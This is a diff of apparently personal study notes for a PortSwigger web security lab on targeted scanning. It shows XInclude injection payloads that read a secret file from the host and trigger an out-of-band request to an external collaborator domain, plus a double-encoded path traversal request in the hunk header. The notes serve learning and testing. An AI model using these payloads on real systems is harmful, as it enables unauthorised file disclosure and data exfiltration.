@@ -1455,11 +1455,18 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 ![scan-defined-insertion-points](images/scan-defined-insertion-points.png)  
 
->Scanner detected xmlns on stockId parameter and can lead to reading file on host parse text.  
+>Scanner detected **XML injection** vulnerability on storeId parameter and this lead to reading the secret Carlos file.  
 
 ```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>
 ```  
+
+>Out of band XInclude request, need hosted DTD to read local file.  
+
+```xml
+<hqt xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://vfe7mddka77io3rz2xjvvbum5db9zzn0br1er2g.oastify.com/foo"/></hqt>
+```  
+
 
 [PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)  
   
